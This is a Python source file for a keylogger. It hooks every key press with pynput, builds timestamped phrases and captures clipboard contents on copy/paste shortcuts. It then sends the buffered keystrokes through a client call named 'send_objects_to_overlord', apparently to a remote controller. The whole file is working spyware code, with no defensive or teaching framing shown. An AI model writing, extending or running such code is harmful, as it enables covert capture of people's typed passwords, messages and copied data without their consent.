from pynput.keyboard import Key, Listener
from datetime import datetime
import pyperclip
from client import bot
from models.phrasestroke import PhraseStroke

def get_current_time():
    return datetime.now()

class KeyListener:
    BUFFER_CAPACITY = 1
    COPY_PASTE = {"Key.cmd", '\xc3\xa7'}
    TERM_KEYS = map(str, [Key.tab, Key.enter])

    def __init__(self):
        self.initialize_ivars()
        # TODO replace COPY_PASTE with ctrl c if windows

    def initialize_ivars(self):
        self.buffered = []
        # Stores current keys pressed at a given time, used to detect Keyboard shortcuts
        self.current_key_combo = set()
        # Stops key press detection if set to True
        self.stop = False
        self.reset_for_next_phrase()

    def reset_for_next_phrase(self):
        self.current_phrase = ""
        self.start_timestamp = None

    def run(self):
        with Listener(on_press=lambda key: self.on_press(key),
                        on_release=lambda key: self.on_release(key)) as listener:
            listener.join()

    def handle_key_combo_detection(self, key):
        if key in self.COPY_PASTE:
            self.current_key_combo.add(key)
            if all([k in self.current_key_combo for k in self.COPY_PASTE]):
                clipboard = pyperclip.paste()
                # Timestamp doesn't mean anything here, nor does terminating
                # TODO make terminating meaningful? search by copy pasta
                self.buffered.append(PhraseStroke(self.start_timestamp,
                                                  self.current_phrase,
                                                  terminating=str(self.current_key_combo)))

    def on_press(self, key):
        if self.stop:
            return
        try:
            a_key = key.char.encode('utf-8').strip()
        except AttributeError, UnicodeEncodeError:
            a_key = str(key)

        print(a_key)

        self.handle_key_combo_detection(a_key)

        if a_key in self.TERM_KEYS and len(self.current_phrase) is not 0:
            self.buffered.append(PhraseStroke(self.start_timestamp,
                                              self.current_phrase,
                                              terminating=a_key))
            self.reset_for_next_phrase()
            return
        elif a_key.find("Key.") == 0:
            # Reset current phrase, user must have switched applications, so discard current phrase?
            self.current_phrase = ""
            return

        if self.current_phrase is "":
            self.start_timestamp = get_current_time()
        self.current_phrase += a_key

        if len(self.buffered) >= self.BUFFER_CAPACITY:
            bot.send_objects_to_overlord(self.buffered)
            # Flush buffer
            self.initialize_ivars()

    def on_release(self, key):
        # Remove key from current key combo
        try:
            self.current_key_combo.remove(key)
        except KeyError:
            pass

def main():
    key_listener = KeyListener()
    key_listener.run()

if __name__ == '__main__':
    main()
